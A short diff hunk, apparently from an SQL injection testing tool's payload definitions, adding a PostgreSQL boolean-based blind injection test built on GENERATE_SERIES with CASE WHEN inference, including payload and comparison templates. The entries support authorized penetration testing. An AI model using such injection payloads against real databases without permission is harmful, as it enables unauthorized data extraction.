@@ -672,6 +672,25 @@ Formats:
     </test>
 
     <test>
+        <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
+        <request>
+            <payload>(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)</payload>
+        </request>
+        <response>
+            <comparison>(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)</title>
         <stype>1</stype>
         <level>3</level>
